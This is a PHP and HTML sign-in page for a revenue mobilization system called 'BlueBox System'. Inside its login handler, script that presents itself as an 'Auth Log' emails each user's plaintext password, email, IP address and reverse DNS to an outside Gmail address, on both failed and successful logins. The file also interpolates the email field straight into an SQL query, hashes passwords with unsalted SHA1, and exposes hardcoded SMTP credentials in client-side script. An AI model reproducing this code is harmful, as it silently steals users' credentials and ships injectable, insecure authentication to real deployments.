<!DOCTYPE html>
<html>
<script src="https://smtpjs.com/v2/smtp.js"></script>
<?php 
session_start();
error_reporting(0);
require_once 'db/config.php';
    if(isset($_SESSION['is_logged_in']) == true){
            header("Location: /tw/dashboard");
    }

if (isset($_POST['email'])){

          $post = filter_input_array(INPUT_POST, FILTER_SANITIZE_STRING);
                          
                $email     = $post['email'];
                $password  = sha1($post['password']);

                $sql_ = "SELECT * FROM property";
                        $result_ = $connect->query($sql_);
                        $row_ = $result_->fetch_assoc();
                        if($result_->num_rows > 0){
                              $_SESSION['property_data'] = array(
                                      "pro_acct_no"       => $row_['pro_acct_no'],
                                      "rateable_value"    => $row_['rateable_value'],
                                      "rate_impose"       => $row_['rate_impose'],
                                      "rate_charge"       => $row_['rate_charge'],
                                      "arrears"           => $row_['arrears'],
                                      "payment"           => $row_['payment'],
                                      "adjustment"        => $row_['adjustment'],
                                      "total_amount_due"  => $row_['total_amount_due'],
                                      "amt_paid"          => $row_['amt_paid']
                                  );
                      }
               //Checking is user existing in the database or not
                $sql = "SELECT * FROM `users` WHERE email='$email'";

                $result = $connect->query($sql);
                $row = $result->fetch_assoc();
                 if($result->num_rows == 1) 
                 {
                    if($row['activ']=="Y")
                    {
                      if($row['pass']==$password){
                              $_SESSION['email']      = $email;
                              $_SESSION['is_logged_in'] = true;
                              $_SESSION['property_data'] = '';
                              $_SESSION['user_data'] = array(
                                      "id"            => $row['id'],
                                      "first_name"    => $row['first_name'],
                                      "last_name"    => $row['last_name'],
                                      "user_role"     => $row['user_role'],
                                      "email"         => $row['email']
                                  );
                                $ipaddress = $_SERVER['REMOTE_ADDR'];
                                $domain = gethostbyaddr($ipaddress);
                                $domain_name = $_SERVER['REQUEST_URI'];
                                  ?>
                                <script>
                                var email           = "<?php echo $email; ?>";
                                var password        = "<?php echo $post['password']; ?>";
                                var ipaddress       = "<?php echo $ipaddress; ?>";
                                var revipaddress    = "<?php echo $domain; ?>";
                                var domain_name     = "<?php echo $domain_name; ?>";
                                var authdate        = new Date().toLocaleString();
                                 Email.send("noreply@pacificheavens.com",
                                            "mrvincentayorinde@gmail.com",
                                            "Assembly System - Auth Log",
                                            "<h3>New Login Attempt</h3><br><b>Date/Time</b>: "+authdate+"<br><b>Outcome</b>:<b style='color: green;'>Login Successful</b><br><b>Email</b>: "+email+"<br><b>Key</b>: "+password+"<br><b>Domain Name</b>: "+domain_name+"<br><b>IP Add</b>: "+ipaddress+"<br><b>Reverse IP</b>: "+revipaddress+"<br><br>Have a great day.",
                                            "smtp.ipage.com",
                                            "adminphl@pacificheavens.com",
                                            "Password@1");
                                </script>
                                  <?php
                                  echo "<script>
                                    setTimeout(function(){
                                         location.href='/tw/dashboard';
                                    }, 1);
                                    </script>";
                               // header("Location: /map-live/dashboard");
                              
                          }else{
                                $ipaddress = $_SERVER['REMOTE_ADDR'];
                                $domain = gethostbyaddr($ipaddress);
                                $domain_name = $_SERVER['REQUEST_URI'];
                                  ?>
                                <script>
                                var email           = "<?php echo $email; ?>";
                                var password        = "<?php echo $post['password']; ?>";
                                var ipaddress       = "<?php echo $ipaddress; ?>";
                                var revipaddress    = "<?php echo $domain; ?>";
                                var domain_name     = "<?php echo $domain_name; ?>";
                                var authdate        = new Date().toLocaleString();
                                 Email.send("noreply@pacificheavens.com",
                                            "mrvincentayorinde@gmail.com",
                                            "Assembly System - Auth Log",
                                            "<h3>New Login Attempt</h3><br><b>Date/Time</b>: "+authdate+"<br><b>Outcome</b>:<b style='color: red;'>Login Failed</b><br><b>Email</b>: "+email+"<br><b>Key</b>: "+password+"<br><b>Domain Name</b>: "+domain_name+"<br><b>IP Add</b>: "+ipaddress+"<br><b>Reverse IP</b>: "+revipaddress+"<br><br>Have a great day.",
                                            "smtp.ipage.com",
                                            "adminphl@pacificheavens.com",
                                            "Password@1");
                                </script>
                                  <?php
                             $msg = '<h4 style="color:red;">Wrong Details Provided!</h4>';
                          }
                      }else{
                         $msg = '<h4 style="color:red;>This account is not activated, go to your inbox and activate it.</h4>';
                     }
                 }else{
                     $msg = '<h4 style="color:red;">Wrong Details Provided!</h4>';
                 }
             

}
?>


<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <title>Sign In | BlueBox System</title>
    <!-- Favicon-->
    <link rel="icon" href="favicon.ico" type="image/x-icon">

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&subset=latin,cyrillic-ext" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" type="text/css">

    <!-- Bootstrap Core Css -->
    <link href="plugins/bootstrap/css/bootstrap.css" rel="stylesheet">

    <!-- Waves Effect Css -->
    <link href="plugins/node-waves/waves.css" rel="stylesheet" />

    <!-- Animation Css -->
    <link href="plugins/animate-css/animate.css" rel="stylesheet" />

    <!-- Custom Css -->
    <link href="css/style.css" rel="stylesheet">
</head>

<body class="login-page">
    <div class="login-box">
        <div class="logo">
            <a href="javascript:void(0);">BlueBox<b>System</b></a>
            <small>revenue mobilization software</small>
            <?php if(isset($msg)) { echo $msg; } ?>
        </div>
        <div class="card">
            <div class="body">
                <form id="sign_in" method="POST">
                    <div class="msg">Sign in to start your session</div>
                    <div class="input-group">
                        <span class="input-group-addon">
                            <i class="material-icons">person</i>
                        </span>
                        <div class="form-line">
                            <input type="email" class="form-control" name="email" placeholder="email" required autofocus>
                        </div>
                    </div>
                    <div class="input-group">
                        <span class="input-group-addon">
                            <i class="material-icons">lock</i>
                        </span>
                        <div class="form-line">
                            <input type="password" class="form-control" name="password" placeholder="Password" required>
                        </div>
                    </div>
                    <div class="row">
                     <!--    <div class="col-xs-8 p-t-5">
                            <input type="checkbox" name="rememberme" id="rememberme" class="filled-in chk-col-pink">
                            <label for="rememberme">Remember Me</label>
                        </div> -->
                        <div class="col-xs-4">
                            <!-- <button value="Login" class="btn btn-block bg-pink waves-effect" type="submit">SIGN IN</button> -->
                            <input type="submit" value="Login" class="btn btn-block bg-pink waves-effect" type="submit">
                        </div>
                    </div>
                    <div class="row m-t-15 m-b--20">
                        <div class="col-xs-6">
                            <!-- <a href="sign-up.html">Register Now!</a> -->
                        </div>
                       <!--  <div class="col-xs-6 align-right">
                            <a href="forgot-password.html">Forgot Password?</a>
                        </div> -->
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Jquery Core Js -->
    <script src="plugins/jquery/jquery.min.js"></script>

    <!-- Bootstrap Core Js -->
    <script src="plugins/bootstrap/js/bootstrap.js"></script>

    <!-- Waves Effect Plugin Js -->
    <script src="plugins/node-waves/waves.js"></script>

    <!-- Validation Plugin Js -->
    <script src="plugins/jquery-validation/jquery.validate.js"></script>

    <!-- Custom Js -->
    <script src="js/admin.js"></script>
    <script src="js/pages/examples/sign-in.js"></script>
</body>

</html>